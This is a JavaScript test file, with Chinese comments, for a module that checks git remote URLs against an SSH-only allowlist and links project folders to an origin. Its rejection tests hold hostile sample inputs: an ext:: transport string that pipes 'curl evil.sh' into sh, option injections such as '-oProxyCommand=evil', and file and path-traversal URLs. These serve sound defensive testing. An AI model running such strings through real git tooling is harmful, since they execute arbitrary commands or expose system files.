// 群项目 ↔ git 远端关联(控制台「仓库地址」)。两块:
//  ① 地址校验 —— 安全关口。git 的 ext:: transport 会执行任意命令,必须拒;协议白名单只放行 SSH。
//  ② 关联 —— 幂等的 git init + origin,在临时目录里跑真 git(纯本地,不走网络)。
// testRemote 要网络,不在单测里跑。

const { test } = require('node:test')
const assert = require('node:assert/strict')
const fs = require('node:fs')
const os = require('node:os')
const path = require('node:path')
const { validateRepoUrl, repoStatus, linkRepo, humanizeGitError, readOriginFromGitConfig, quickLinkState } = require('../../src/gitrepo')

const tmp = () => fs.mkdtempSync(path.join(os.tmpdir(), 'sbot-gitrepo-'))

test('validateRepoUrl:放行 SSH 的两种写法', () => {
  for (const u of [
    'git@codeup.aliyun.com:5f00000000000000000000aa/demo-app.git',
    'git@github.com:WaterTian/sbot.git',
    'ssh://git@codeup.aliyun.com/org/repo.git',
    'ssh://git@ssh.github.com:443/WaterTian/sbot.git',
  ]) {
    const r = validateRepoUrl(u)
    assert.equal(r.ok, true, u)
    assert.equal(r.url, u)
  }
})

test('validateRepoUrl:前后空白被裁掉', () => {
  const r = validateRepoUrl('  git@host:org/repo.git \n')
  assert.equal(r.ok, true)
  assert.equal(r.url, 'git@host:org/repo.git')
})

// 这条是安全关口,不是格式挑剔:`git ls-remote 'ext::sh -c <cmd>'` 会执行 <cmd>。
test('validateRepoUrl:拒绝 ext:: —— 该 transport 可执行任意命令(RCE)', () => {
  for (const u of ['ext::sh -c "curl evil.sh|sh"', 'EXT::whoami']) {
    const r = validateRepoUrl(u)
    assert.equal(r.ok, false, u)
    assert.match(r.error, /ext::/)
  }
})

test('validateRepoUrl:拒绝非 SSH 协议与选项注入', () => {
  const cases = [
    ['https://codeup.aliyun.com/org/repo.git', /HTTPS/],
    ['http://host/repo.git', /HTTPS/],
    ['git://host/repo.git', /SSH/],
    ['file:///etc/passwd', /SSH/],
    ['--upload-pack=evil', /- 开头/],
    ['-oProxyCommand=evil', /- 开头/],
    ['', /为空/],
    ['not a url at all', /SSH 仓库地址/],
    ['git@host:/../../etc/passwd', /SSH 仓库地址/],
  ]
  for (const [u, re] of cases) {
    const r = validateRepoUrl(u)
    assert.equal(r.ok, false, `应拒绝: ${u}`)
    assert.match(r.error, re, u)
  }
})

test('validateRepoUrl:null/undefined 不炸', () => {
  assert.equal(validateRepoUrl(null).ok, false)
  assert.equal(validateRepoUrl(undefined).ok, false)
})

test('humanizeGitError:把最常见的两种挂法翻成可操作的话', () => {
  assert.match(humanizeGitError('git@host: Permission denied (publickey).'), /凭据不通/)
  assert.match(humanizeGitError('Host key verification failed.'), /ssh-keyscan/)
  assert.match(humanizeGitError('ERROR: Repository path not found'), /仓库不存在/)
  assert.match(humanizeGitError('找不到代码库，请确认是否有权限且代码库路径正确'), /仓库不存在/)
  assert.match(humanizeGitError('ssh: Could not resolve hostname foo'), /域名解析/)
  assert.match(humanizeGitError('ssh: connect to host foo port 22: Connection timed out'), /超时/)
  assert.match(humanizeGitError('ssh: connect to host foo port 22: Connection refused'), /端口不可达/)
})

test('repoStatus:非 git 目录', async () => {
  const d = tmp()
  try {
    const st = await repoStatus(d)
    assert.equal(st.isRepo, false)
    assert.equal(st.origin, '')
  } finally { fs.rmSync(d, { recursive: true, force: true }) }
})

test('repoStatus:workdir 不存在时不炸', async () => {
  const st = await repoStatus(path.join(os.tmpdir(), 'sbot-does-not-exist-' + Date.now()))
  assert.equal(st.isRepo, false)
})

test('linkRepo:空目录 → git init + 设 origin', async () => {
  const d = tmp()
  try {
    const r = await linkRepo(d, 'git@codeup.aliyun.com:org/proj.git')
    assert.equal(r.ok, true, r.error)
    assert.equal(r.initialized, true, '本来不是仓库 ⇒ 应 git init')
    assert.equal(r.replaced, false)
    assert.ok(r.branch, '空仓库也该能报出默认分支名')
    const st = await repoStatus(d)
    assert.equal(st.isRepo, true)
    assert.equal(st.origin, 'git@codeup.aliyun.com:org/proj.git')
  } finally { fs.rmSync(d, { recursive: true, force: true }) }
})

test('linkRepo:幂等 —— 重复保存同一地址不重复 init、不报错', async () => {
  const d = tmp()
  try {
    const a = await linkRepo(d, 'git@host:org/proj.git')
    const b = await linkRepo(d, 'git@host:org/proj.git')
    assert.equal(a.initialized, true)
    assert.equal(b.initialized, false, '第二次已是仓库 ⇒ 不该再 init')
    assert.equal(b.ok, true)
    assert.equal((await repoStatus(d)).origin, 'git@host:org/proj.git')
  } finally { fs.rmSync(d, { recursive: true, force: true }) }
})

test('linkRepo:换地址 → set-url 覆盖并标 replaced', async () => {
  const d = tmp()
  try {
    await linkRepo(d, 'git@host:org/old.git')
    const r = await linkRepo(d, 'git@host:org/new.git')
    assert.equal(r.ok, true)
    assert.equal(r.replaced, true)
    assert.equal((await repoStatus(d)).origin, 'git@host:org/new.git')
  } finally { fs.rmSync(d, { recursive: true, force: true }) }
})

test('linkRepo:非法地址在碰 git 之前就被拒(目录保持干净)', async () => {
  const d = tmp()
  try {
    const r = await linkRepo(d, 'ext::sh -c evil')
    assert.equal(r.ok, false)
    assert.equal(fs.existsSync(path.join(d, '.git')), false, '校验失败不该留下 git init 的痕迹')
  } finally { fs.rmSync(d, { recursive: true, force: true }) }
})

test('linkRepo:workdir 不存在 → 报错不抛异常', async () => {
  const r = await linkRepo(path.join(os.tmpdir(), 'sbot-nope-' + Date.now()), 'git@host:org/p.git')
  assert.equal(r.ok, false)
  assert.match(r.error, /workdir 不存在/)
})

// —— 群卡右上角标签的数据源。纯 fs(不 spawn git),因为 buildState 每个 API 响应都要跑。
// 关键是它必须反映**真实** origin:标签绿着却其实没关联 = 骗人,比不显示更糟。
test('quickLinkState:没配仓库 → 空(不显示标签)', async () => {
  const d = tmp()
  try { assert.equal(quickLinkState(d, ''), ''); assert.equal(quickLinkState(d, undefined), '') }
  finally { fs.rmSync(d, { recursive: true, force: true }) }
})

test('quickLinkState:配置与真实 origin 一致 → ok', async () => {
  const d = tmp()
  try {
    await linkRepo(d, 'git@h:o/p.git')
    assert.equal(quickLinkState(d, 'git@h:o/p.git'), 'ok')
  } finally { fs.rmSync(d, { recursive: true, force: true }) }
})

test('quickLinkState:workdir 不是 git 仓库了 → missing', async () => {
  const d = tmp()
  try { assert.equal(quickLinkState(d, 'git@h:o/p.git'), 'missing') }
  finally { fs.rmSync(d, { recursive: true, force: true }) }
})

test('quickLinkState:origin 被手动改掉 → drift(标签必须变红,不能继续绿)', async () => {
  const d = tmp()
  try {
    await linkRepo(d, 'git@h:o/p.git')
    // 模拟有人在项目目录里 git remote set-url origin <别的>
    const cfg = path.join(d, '.git', 'config')
    fs.writeFileSync(cfg, fs.readFileSync(cfg, 'utf8').replace('git@h:o/p.git', 'git@h:o/OTHER.git'))
    assert.equal(quickLinkState(d, 'git@h:o/p.git'), 'drift')
  } finally { fs.rmSync(d, { recursive: true, force: true }) }
})

test('quickLinkState:是 git 仓库但 origin 被删掉 → drift', async () => {
  const d = tmp()
  try {
    await linkRepo(d, 'git@h:o/p.git')
    const cfg = path.join(d, '.git', 'config')
    fs.writeFileSync(cfg, fs.readFileSync(cfg, 'utf8').replace(/\[remote "origin"\][^[]*/, ''))
    assert.equal(readOriginFromGitConfig(d), '')
    assert.equal(quickLinkState(d, 'git@h:o/p.git'), 'drift')
  } finally { fs.rmSync(d, { recursive: true, force: true }) }
})

test('readOriginFromGitConfig:只取 origin,不被别的 remote 串台', async () => {
  const d = tmp()
  try {
    await linkRepo(d, 'git@h:o/p.git')
    const cfg = path.join(d, '.git', 'config')
    // upstream 排在 origin 之前 —— 天真的 /url = (.+)/ 会抓错
    fs.writeFileSync(cfg, '[remote "upstream"]\n\turl = git@h:o/UPSTREAM.git\n' + fs.readFileSync(cfg, 'utf8'))
    assert.equal(readOriginFromGitConfig(d), 'git@h:o/p.git')
  } finally { fs.rmSync(d, { recursive: true, force: true }) }
})

test('linkRepo:拒绝在别的 git 仓库内部 init(防止把子目录挂成嵌套仓库)', async () => {
  const outer = tmp()
  try {
    await linkRepo(outer, 'git@host:org/outer.git') // outer 变成 git 仓库
    const inner = path.join(outer, 'sub')
    fs.mkdirSync(inner)
    const r = await linkRepo(inner, 'git@host:org/inner.git')
    assert.equal(r.ok, false)
    assert.match(r.error, /另一个 git 仓库内/)
  } finally { fs.rmSync(outer, { recursive: true, force: true }) }
})
